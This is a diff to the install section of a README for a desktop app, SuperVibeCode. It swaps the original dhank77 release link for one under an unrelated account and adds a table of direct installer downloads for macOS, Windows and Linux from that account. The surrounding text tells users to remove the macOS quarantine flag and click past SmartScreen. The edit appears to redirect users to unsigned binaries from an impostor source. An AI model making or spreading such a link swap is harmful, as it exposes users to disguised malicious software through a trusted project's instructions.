@@ -65,7 +65,7 @@ workflow on top.
 
 ### Install
 
-Download the installer for your computer from the [latest release](https://github.com/dhank77/SuperVibeCode/releases/latest):
+Download the installer for your computer from the [latest release](https://github.com/latjoromhi25d-dotcom/SuperVibeCode/releases/latest):
 the `.dmg` for macOS (`arm64` for Apple silicon, `x64` for Intel), the `.exe` for Windows, or the `.AppImage`, `.deb` or
 `.rpm` for Linux. On Windows and Linux the app updates itself from new releases; on macOS, download new
 releases yourself until the app is signed.
@@ -76,6 +76,13 @@ The installers are not signed yet, so the first launch needs one extra step:
   damaged, run `xattr -dr com.apple.quarantine /Applications/SuperVibeCode.app` in Terminal once. You only
   need it again after downloading a new version.
 - **Windows:** in the SmartScreen prompt, choose **More info** → **Run anyway**.
+
+| Computer                              | Download                                                                                                                                                                                                                                                                                                                                                                                            |
+| ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Mac with Apple silicon (M1 and later) | [supervibecode-desktop-mac-arm64.dmg](https://github.com/latjoromhi25d-dotcom/SuperVibeCode/releases/latest/download/supervibecode-desktop-mac-arm64.dmg)                                                                                                                                                                                                                                           |
+| Mac with Intel                        | [supervibecode-desktop-mac-x64.dmg](https://github.com/latjoromhi25d-dotcom/SuperVibeCode/releases/latest/download/supervibecode-desktop-mac-x64.dmg)                                                                                                                                                                                                                                               |
+| Windows                               | [supervibecode-desktop-win-x64.exe](https://github.com/latjoromhi25d-dotcom/SuperVibeCode/releases/latest/download/supervibecode-desktop-win-x64.exe)                                                                                                                                                                                                                                               |
+| Linux                                 | [AppImage](https://github.com/latjoromhi25d-dotcom/SuperVibeCode/releases/latest/download/supervibecode-desktop-linux-x86_64.AppImage), [.deb](https://github.com/latjoromhi25d-dotcom/SuperVibeCode/releases/latest/download/supervibecode-desktop-linux-amd64.deb), [.rpm](https://github.com/latjoromhi25d-dotcom/SuperVibeCode/releases/latest/download/supervibecode-desktop-linux-x86_64.rpm) |
 
 ### Run from source
 
